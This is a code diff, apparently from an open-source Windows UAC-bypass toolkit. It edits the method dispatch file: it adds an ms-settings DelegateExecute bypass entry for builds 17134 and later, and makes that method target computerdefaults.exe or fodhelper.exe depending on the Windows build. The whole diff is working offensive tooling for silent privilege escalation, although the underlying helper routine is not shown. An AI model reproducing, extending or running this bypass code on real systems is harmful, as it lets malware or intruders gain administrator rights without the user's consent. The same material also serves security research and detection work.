@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.25
+*  VERSION:     3.26
 *
-*  DATE:        05 May 2020
+*  DATE:        23 May 2020
 *
 *  UAC bypass dispatch.
 *
@@ -147,7 +147,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodEditionUpgradeManager, NULL, { 14393, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodDebugObject, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodGlupteba, NULL, { 7600, 15063 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodShellChangePk, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
+    { MethodShellChangePk, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodMsSettings, NULL, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
 };
 
 #define WDCallbackTypeMagicVer1 282647531814912
@@ -916,6 +917,7 @@ UCM_API(MethodUiAccess)
 UCM_API(MethodMsSettings)
 {
     LPWSTR lpszPayload = NULL;
+    LPWSTR lpszTargetApp = NULL;
 
     UNREFERENCED_PARAMETER(Parameter);
 
@@ -924,7 +926,12 @@ UCM_API(MethodMsSettings)
     else
         lpszPayload = g_ctx->szOptionalParameter;
 
-    return ucmMsSettingsDelegateExecuteMethod(lpszPayload);
+    if (g_ctx->dwBuildNumber >= 17134)
+        lpszTargetApp = COMPUTERDEFAULTS_EXE;
+    else
+        lpszTargetApp = FODHELPER_EXE;
+
+    return ucmMsSettingsDelegateExecuteMethod(lpszPayload, lpszTargetApp);
 }
 
 UCM_API(MethodTyranid)
